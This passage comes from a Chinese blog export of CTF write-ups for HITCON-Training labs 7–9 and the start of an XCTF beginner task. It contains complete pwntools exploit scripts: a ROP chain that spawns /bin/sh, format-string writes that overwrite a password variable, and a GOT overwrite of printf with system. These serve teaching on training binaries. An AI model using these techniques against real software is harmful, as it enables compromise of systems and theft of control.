elf.plt[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\" :\\n\"</span>)</span><br><span class=\"line\">rop = offset * <span class=\"string\">\"a\"</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(leaveret) <span class=\"comment\"># retn addr of read</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr) <span class=\"comment\"># arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\"># arg3</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(rop)</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">rop = p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\"># fake ebp</span></span><br><span class=\"line\">rop += p32(puts_plt) <span class=\"comment\"># retn addr</span></span><br><span class=\"line\">rop += p32(pop1) <span class=\"comment\"># retn addr of puts_plt</span></span><br><span class=\"line\">rop += p32(elf.got[<span class=\"string\">'__libc_start_main'</span>])</span><br><span class=\"line\">rop += p32(read_plt) <span class=\"comment\"># after pop 1</span></span><br><span class=\"line\">rop += p32(leaveret)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0</span>) <span class=\"comment\"># arg1</span></span><br><span class=\"line\">rop += p32(rwaddr + <span class=\"number\">0x100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\">rop += p32(<span class=\"number\">100</span>) <span class=\"comment\">#arg2</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvline()[:<span class=\"number\">4</span>])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">rop = p32(rwaddr)</span><br><span class=\"line\">rop += p32(system)</span><br><span class=\"line\">rop += p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">rop += p32(binsh)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(rop)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab7——Crack\"><a href=\"#Lab7——Crack\" class=\"headerlink\" title=\"Lab7——Crack\"></a>Lab7——Crack</h2><h3 id=\"防护-5\"><a href=\"#防护-5\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>开了canary，栈利用应该比较困难。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab7$ checksec crack</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab7/crack&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-5\"><a href=\"#分析-5\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>该题是典型的格式化字符串利用，将bss段的全局变量passwprd覆盖为已知值即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> fd; <span class=\"comment\">// ST14_4</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [esp+8h] [ebp-80h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+18h] [ebp-70h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v8; <span class=\"comment\">// [esp+7Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  v3 = time(<span class=\"number\">0</span>);</span><br><span class=\"line\">  srand(v3);</span><br><span class=\"line\">  fd = open(<span class=\"string\">\"/dev/urandom\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  read(fd, &amp;password, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What your name ? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x63</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Hello ,\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(&amp;buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Your password :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">0xF</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( atoi(&amp;nptr) == password )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Congrt!!\"</span>);</span><br><span class=\"line\">    system(<span class=\"string\">\"cat /home/crack/flag\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Goodbyte\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>首先测得 or 调试得到格式化字符串在栈中的偏移为10，然后布置<code>target_addr%10$n</code>的格式化字符串，向target_addr写入4。然后输入4即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./crack\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a048</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%10$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">\":\"</span>, <span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>效果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Congrt!!</span><br><span class=\"line\">cat: /home/crack/flag: No such file or directory</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab8——craxme\"><a href=\"#Lab8——craxme\" class=\"headerlink\" title=\"Lab8——craxme\"></a>Lab8——craxme</h2><h3 id=\"防护-6\"><a href=\"#防护-6\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab8$ checksec craxme</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab8/craxme&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-6\"><a href=\"#分析-6\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>和Lab7相似，也是fmt的利用，分别向目标地址写入218和0xFACEB00C，前者直接写即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a038</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">218</span> - <span class=\"number\">4</span>) * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"%7$n\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>后者需要有一定的构造。首先，由于是小端存储，要向内存中写4个byte的数据，只要用<code>$hhn</code>分别向单字节写即可。如要想写入0x12345678，相当于分别向target_addr ~ target_addr + 3的地址写入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x78</span><br><span class=\"line\">0x56</span><br><span class=\"line\">0x34</span><br><span class=\"line\">0x12</span><br></pre></td></tr></table></figure>\n<p>首先将地址放在栈中，然后计算应该padding多少个字节，最后用hhn写入。注意取余</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./craxme\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">target_addr = <span class=\"number\">0x804a038</span></span><br><span class=\"line\">target = <span class=\"number\">0xFACEB00C</span></span><br><span class=\"line\">payload = p32(target_addr) + p32(target_addr + <span class=\"number\">1</span>) + p32(target_addr + <span class=\"number\">2</span>) + p32(target_addr + <span class=\"number\">3</span>)</span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0x0c</span> - len(payload)) % <span class=\"number\">256</span>) + <span class=\"string\">\"c%7$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xb0</span> - <span class=\"number\">0x0c</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%8$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xce</span> - <span class=\"number\">0xb0</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%9$hhn\"</span></span><br><span class=\"line\">payload += <span class=\"string\">\"%\"</span> + str((<span class=\"number\">0xfa</span> - <span class=\"number\">0xce</span>) &amp; <span class=\"number\">0xff</span>)  + <span class=\"string\">\"c%10$hhn\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab9——playfmt\"><a href=\"#Lab9——playfmt\" class=\"headerlink\" title=\"Lab9——playfmt\"></a>Lab9——playfmt</h2><h3 id=\"防护-7\"><a href=\"#防护-7\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab9$ checksec playfmt</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab9/playfmt&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-7\"><a href=\"#分析-7\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>也是格式化字符串的利用，每次向bss段上读入0xc8的格式化字符串，然后printf，当读入quit时，退出。</p>\n<p>显然，因为格式化字符串不在栈上，所以处理起来有些麻烦，首先可以看到相对偏移为15的位置有一个libc上的地址，将它leak出来获得libc基地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf0c│+0x0000: 0x08048540  →  &lt;do_fmt+69&gt; add esp, 0x10\t ← $esp</span><br><span class=\"line\">0xffffcf10│+0x0004: 0x0804a060  →  &quot;AAAA%p%p%p%p%p%p%p%p%p&quot;</span><br><span class=\"line\">0xffffcf14│+0x0008: 0x08048640  →  &quot;quit&quot;</span><br><span class=\"line\">0xffffcf18│+0x000c: 0x00000004</span><br><span class=\"line\">0xffffcf1c│+0x0010: 0x0804857c  →  &lt;play+51&gt; add esp, 0x10 </span><br><span class=\"line\">0xffffcf20│+0x0014: 0x08048645  →  &quot;=====================&quot;</span><br><span class=\"line\">0xffffcf24│+0x0018: 0xf7fb1000  →  0x001b1db0</span><br><span class=\"line\">0xffffcf28│+0x001c: 0xffffcf38  →  0xffffcf48  →  0x00000000\t ← $ebp &lt;= ebp1 7</span><br><span class=\"line\">0xffffcf2c│+0x0020: 0x08048584  →  &lt;play+59&gt; nop &lt;= 8</span><br><span class=\"line\">0xffffcf30│+0x0024: 0xf7fb1d60  →  0xfbad2887</span><br><span class=\"line\">gef➤  dereference $esp</span><br><span class=\"line\">0xffffcf34│+0x0028: 0x00000000</span><br><span class=\"line\">0xffffcf38│+0x002c: 0xffffcf48  →  0x00000000 &lt;= ebp2 11</span><br><span class=\"line\">0xffffcf3c│+0x0030: 0x080485b1  →  &lt;main+42&gt; nop &lt;= 12</span><br><span class=\"line\">0xffffcf40│+0x0034: 0xf7fb13dc  →  0xf7fb21e0  →  0x00000000</span><br><span class=\"line\">0xffffcf44│+0x0038: 0xffffcf60  →  0x00000001</span><br><span class=\"line\">0xffffcf48│+0x003c: 0x00000000</span><br><span class=\"line\">0xffffcf4c│+0x0040: 0xf7e17637  →  &lt;__libc_start_main+247&gt; add esp, 0x10</span><br></pre></td></tr></table></figure>\n<p>但是，也因为fmt string不在栈上，想要任意地址写则比较困难，这里参考了Vidar-Team某师傅的题解（<a href=\"https://veritas501.space/2017/05/23/HITCON-training%20writeup/\" target=\"_blank\" rel=\"noopener\">https://veritas501.space/2017/05/23/HITCON-training%20writeup/</a>），利用栈中ebp的相对偏移已知的特点。我们可以看到0xffffcf28处ebp指向0xffffcf38处，而0xffffcf38处指向0xffffcf48处。</p>\n<p>这里有几个需要注意的点：</p>\n<ul>\n<li>首先我们需要leak栈地址，才能利用格式化字符串漏洞进行写入，通过”%6$x”将ebp1处存的ebp2的栈地址leak出来，然后根据相对偏移算出ebp1、nop1、nop2的地址。</li>\n<li>如果我们修改ebp1，就相当于向ebp2的地址写，再修改ebp2，也就相当于往任意地址写。</li>\n<li>注意到栈地址只有低2个字节不同，所以用hn写入低两个字节即可修改ebp1处和ebp2处的地址。</li>\n<li>我们想要劫持got表，将printf@got修改为system。由Lab8可以知道，想写入一个大整数，直接写4个byte是不行的，所以在这里我们分开写，两个byte两个byte的写：将nop1修改为printf@got的地址，将nop2修改为printf@got + 2的地址，然后用%c$hn写入即可。</li>\n</ul>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>完整的exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"%15$paaaa\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">addr = int(p.recvuntil(<span class=\"string\">\"aaaa\"</span>).split(<span class=\"string\">'aaaa'</span>)[<span class=\"number\">0</span>].split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">-1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>] - <span class=\"number\">247</span></span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">printfgot = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"%6$x\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">ebp2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">ebp1 = ebp2 - <span class=\"number\">0x10</span></span><br><span class=\"line\">nop2 = ebp2 + <span class=\"number\">0x4</span></span><br><span class=\"line\">nop1 = ebp2 - <span class=\"number\">0xc</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop1</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop1 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop1] = printgot</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(printfgot &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop2 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop2] = printgot + 2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str((printfgot + <span class=\"number\">2</span>) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [printgot] = system</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%11$hn\"</span> + <span class=\"string\">\"%\"</span> + str(((system &amp; <span class=\"number\">0xffff</span>) - (system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>)) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%7$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<hr>\n<p>本篇到此为止，接下来是glibc heap exploit的题解。</p>\n","text":"Lab1——sysmagic防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab1$ checksec sysmagic<br>[*] &apos;/home/liwc/pwn","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}]},{"title":"攻防世界刷题——新手练习","slug":"攻防世界刷题——新手练习","date":"2019-03-20T08:15:35.000Z","updated":"2019-04-21T02:59:31.207Z","comments":true,"path":"api/articles/攻防世界刷题——新手练习.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"新手练习\"><a href=\"#新手练习\" class=\"headerlink\" title=\"新手练习\"></a>新手练习</h1><h2 id=\"when-did-you-born\"><a href=\"#when-did-you-born\" class=\"headerlink\" title=\"when_did_you_born\"></a>when_did_you_born</h2><p>gets(&amp;v4)处存在栈溢出，覆盖掉v5，为1926(0x786)即可。</p>\n<p>v4 = rsp+0x0; v5 = rsp + 0x8; 所以偏移为0x8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">main</span><span class=\"params\">(__int64 a1, <span class=\"keyword\">char</span> **a2, <span class=\"keyword\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// 